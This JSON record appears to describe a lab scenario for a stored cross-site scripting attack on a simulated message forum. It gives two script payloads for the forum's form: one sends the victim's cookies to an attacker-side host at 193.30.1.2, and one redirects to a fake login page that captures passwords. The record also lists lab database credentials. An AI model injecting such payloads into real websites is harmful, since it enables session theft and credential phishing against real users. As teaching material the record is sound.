{"description":"Cross  Site Scripting attack scenario","goal":"<p>Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites.</p>\n<p>In this scenario I'm going to simulate <strong>Stored XSS Attack:</strong></p>\n<p>Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-I XSS.</p>","solution":"<p>I created a simple message forum in which there are two functions</p>\n<ol>\n<li>Insert message</li>\n<li>receive message</li>\n</ol>\n<p>This forum can be reached at 193.20.1.2</p>\n<p>The message that the attacker inserts in the form is saved in DB called&nbsp; \"xss\". It can be reached at 193.20.1.4 where username = root and password = test</p>\n<p>I created two attack scenarios:</p>\n<p><strong>STEAL COOKIES:</strong></p>\n<p>the attacker steals cookies. In the code I set cookie static \"username = admin and&nbsp; password = pippoXSS\".</p>\n<p>The code \"input.php\" is saved in folder called \"www\".</p>\n<p>the attack string that you have to insert in the form is:</p>\n<p>&lt;script type=\"text/javascript\"&gt;<br />window.location = \\'http://193.30.1.2/savecookies.php?cookies=\\'+document.cookie;<br />&lt;/script&gt;</p>\n<p>when the user clicks on \"receive message\" the script is called, executed by the browser and the cookies are saved on the attacking side in the file called \"save.txt\", you can see it in the folder called \"wwws\".</p>\n<p>&nbsp;</p>\n<p>&nbsp;<strong>REDIRECT TO A WEB PAGE<br /></strong></p>\n<p>In this second scenario the attacker inserts in the DB called \"xss\" a script that when the user clicks on \"receive message\" it is executed by the browser and the user is redirected to a login web page (example: can be a fake chat login).</p>\n<p>When the user inserts username and password the attacker's script steals them and puts them in the file called \"userpwd.txt\"</p>\n<p>the attack string that you have to insert in the form is:</p>\n<p>&lt;script type=\"text/javascript\"&gt;<br />window.location = \\'http://193.30.1.2/index.html?pippo=seiFregato\\';<br />&lt;/script&gt;</p>\n<p>&nbsp;</p>\n<p>When you will replicate the attacks make sure each time the attack string is deleted in the DB.</p>\n<p>You can find all the chat scripts in the \"www\" folder while the attacker scripts in the \"wwws\" folder</p>\n<p>&nbsp;</p>","author":"Gennaro"}
